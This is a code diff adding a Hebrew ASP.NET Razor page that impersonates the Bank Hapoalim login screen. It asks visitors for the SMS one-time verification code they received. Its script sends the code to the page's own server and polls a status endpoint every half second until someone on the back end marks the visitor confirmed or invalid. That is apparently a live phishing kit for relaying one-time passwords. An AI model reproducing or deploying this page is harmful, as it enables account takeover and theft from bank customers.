@@ -1,0 +1,173 @@
+﻿@model Detail;
+@{
+    ViewData["Title"] = "בנק הפועלים - כניסה לחשבונך";
+}
+
+<div class="loader hide">
+    <span style="margin-bottom: 200px; width: 100%; margin-right: 12%">לקוח יקר פעולתך מתבצעת אנא המתן</span>
+    <img src="~/images/loader.gif"
+         alt="loader" />
+</div>
+
+<header>
+    <a class="" aria-label="בנק הפועלים פרטי - קישור לאתר השיווקי">
+        <img src="~/images/logo.png"
+             alt="logo"
+             width="200px"
+             height="34px" />
+    </a>
+
+    <!-- Links -->
+    <ul class="links">
+        <li class="link">
+            <a href="#">
+                <img src="~/svg/support.svg"
+                     alt="שירות ותמיכה" />
+                שירות ותמיכה
+            </a>
+        </li>
+
+        <li class="link">
+            <a href="#">
+                <img src="~/svg/secure-account.svg"
+                     alt="הגנה על החשבון שלי" />
+                הגנה על החשבון שלי
+            </a>
+        </li>
+
+        <li class="link">
+            <a href="#">
+                <img src="~/svg/mistake.svg"
+                     alt="טעויות נפוצות בכניסה לחשבון" />
+                טעויות נפוצות בכניסה לחשבון
+            </a>
+        </li>
+
+        <li class="link">
+            <a href="#">
+                <img src="~/svg/location.svg"
+                     alt="תנאי גישה" />
+                תנאי גישה
+            </a>
+        </li>
+
+        <li class="link">
+            <a href="#">
+                <img src="~/svg/roles.svg"
+                     alt="כללי גלישה בטוחה" />
+                כללי גלישה בטוחה
+            </a>
+        </li>
+    </ul>
+</header>
+
+<section class="hero">
+    <div class="login-container">
+        <h2>כניסה לחשבונך</h2>
+
+        <!-- Form -->
+        <form class="form" method="post">
+            @Html.AntiForgeryToken()
+            <div class="form-inputs-container">
+                <div class="form-group">
+                    <label>נא הזן את קוד האימות שקיבלת</label>
+                    <div>
+                        <input type="text"
+                               name="code"
+                               id="sms"
+                               autocomplete="off"
+                               aria-invalid="false"
+                               inputmode="text"
+                               spellcheck="false"
+                               autocapitalize="none"
+                               required />
+
+                        <!-- Input Icon -->
+                        <span class="input-icon"></span>
+
+                        <!-- Input line -->
+                        <span class="line"></span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="info">
+                <a class="forgot-details">שכחתי קוד משתמש / סיסמה</a>
+
+                <!-- Button -->
+                <button class="btn submit-button">כניסה</button>
+            </div>
+
+            <!-- Login Errors -->
+            <div class="login-errors hide">
+                <span>אחד או יותר מהפרטים המזהים שהקלדת שגוי.</span>
+                <span>יש להבחין בין אותיות גדולות וקטנות באנגלית.</span>
+            </div>
+        </form>
+    </div>
+</section>
+
+
+
+@section Scripts{
+    <script>
+        const loader = document.querySelector(".loader");
+        const submitButton = document.querySelector(".submit-button");
+        const input = document.querySelector("input");
+        const loginErrorResponse = document.querySelector(".login-errors");
+        const postURL = window.origin;
+
+        async function submitForm(e) {
+            e.preventDefault();
+
+            const formData = new FormData();
+            formData.append("code", input.value);
+
+            if (input.value !== "") {
+                loader.classList.remove("hide");
+
+                try {
+                    const response = await fetch(`${postURL}/login/sms`, {
+                        method: "POST",
+                        body: formData,
+                    });
+
+                    if (response.ok) {
+                        const data = await response.json();
+                        console.log("successful", data)
+                        
+                        setInterval(async () => await checkUserStatus(data.user), 500);
+                    }
+
+                } catch (err) {
+                    throw new Error(err);
+                }
+            } else {
+                if (input.value === "")
+                    error.textContent = "עליך להזין קוד משתמש";
+                else
+                    error.textContent = "";
+            }
+        }
+
+        async function checkUserStatus(user) {
+            try {
+                const response = await fetch(`${postURL}/status?user=${user}`);
+                const userStatus = await response.json();
+
+                if (userStatus) {
+                    if (userStatus.confirmed) {
+                        window.location.href = "/login/success";
+                    } else if (userStatus.invalid) {
+                        window.location.reload();
+                    }
+                }
+            } catch (error) {
+                throw new Error(error);
+            }
+        }
+
+        submitButton.addEventListener("click", submitForm);
+        input.addEventListener("keyup", checkInputValues);
+    </script>
+    }
